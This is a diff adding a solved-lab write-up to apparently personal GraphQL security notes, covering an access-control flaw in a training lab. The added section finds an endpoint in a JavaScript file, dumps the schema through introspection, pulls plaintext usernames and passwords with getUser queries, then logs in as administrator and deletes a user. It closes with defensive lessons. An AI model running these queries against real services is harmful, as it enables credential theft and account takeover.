@@ -116,3 +116,26 @@
 {__schema{queryType{name}}}
 {__schema{mutationType{name fields{name}}}}
 ```
+
+## Verified Lab Solution: Accidental Exposure of Private GraphQL Fields
+
+**Lab #37** - SOLVED 2026-07-07
+
+### Attack Chain
+1. **Endpoint Discovery**: Read `/resources/js/gqlUtil.js` → found `/graphql/v1`
+2. **Introspection**: `{__schema{types{name fields{name}}}}` → full schema exposed
+3. **Schema Analysis**: User type had `id`, `username`, `password` fields
+4. **Data Extraction**: 
+   ```
+   {getUser(id:1){id username password}} → administrator / x8ogua73861ggg3zik5v
+   {getUser(id:2){id username password}} → wiener / peter
+   {getUser(id:3){id username password}} → carlos / qk7k0js05yl7secjmqow
+   ```
+5. **Login as Admin**: Used `login` mutation with extracted credentials
+6. **Account Takeover**: Navigated to /admin, deleted carlos
+
+### Key Lessons
+- Always check JavaScript sources for API endpoints
+- GraphQL introspection should be disabled in production
+- Password fields should NEVER be in GraphQL types
+- getUser(id) queries need access control
